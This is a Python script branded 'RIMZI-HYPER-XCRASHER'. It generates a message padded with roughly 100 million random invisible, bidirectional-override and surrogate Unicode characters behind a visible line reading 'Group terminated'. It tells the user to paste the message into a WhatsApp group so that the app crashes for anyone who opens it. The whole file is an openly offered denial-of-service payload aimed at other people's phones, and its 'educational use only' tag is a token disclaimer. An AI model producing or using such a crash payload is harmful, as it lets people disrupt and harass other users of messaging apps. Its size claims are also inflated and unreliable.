# 💥 RIMZI-HYPER-XCRASHER 💥
# 😈 1GB+ WhatsApp Unicode Bomb
# ⚠ Educational use only. Most destructive version.

import os, time, random

def banner():
    os.system("clear")
    print("""
\033[1;31m██████╗ ██╗███╗   ███╗███████╗
\033[1;32m██╔══██╗██║████╗ ████║██╔════╝
\033[1;33m██████╔╝██║██╔████╔██║█████╗  
\033[1;34m██╔═══╝ ██║██║╚██╔╝██║██╔══╝  
\033[1;35m██║     ██║██║ ╚═╝ ██║███████╗
\033[1;36m╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
\033[1;37m 💣 RIMZI-HYPER-XCRASHER 💣
     ☠️ WHATSAPP 1GB INVISIBLE PAYLOAD ☠️
       👑 Code by RIMZI for Rimzi King 👑
""")

def generate_payload():
    invisible = ['\u200B', '\u200C', '\u200D', '\u2063', '\u2060', '\u200E', '\u200F', '\u061C']
    bidi = ['\u202A', '\u202B', '\u202C', '\u202D', '\u202E']
    math_marks = ['\u2061', '\u2062', '\u2063']
    surrogate = ['\uDBFF\uDFFF']
    charset = invisible + bidi + math_marks + surrogate

    # Visible part only 2 lines
    payload = "💀 Group terminated by RIMZI-HYPER-X 😈\n\n"

    # ⚠ Over 1GB Unicode crash payload (approx 100 million chars)
    total_chars = 100_000_000
    print(f"[+] Generating {total_chars} invisible crash characters (1GB payload)...")
    
    for _ in range(total_chars):
        payload += random.choice(charset)

    return payload

def main():
    banner()
    print("[+] Building HYPER-X crash message... This will take time 🔥")
    payload = generate_payload()
    
    print("\n[!] COPY this short message and paste into WhatsApp group:\n")
    print("📩 Visible Message:\n💀 Group terminated by RIMZI-HYPER-X 😈\n\n")
    print("⚠️ Hidden 1GB Crash Payload generated below:\n")
    print(payload)
    print("\n[✔] DONE! Once sent, opening the group = 💣 Instant CRASH!")

if __name__ == "__main__":
    main()
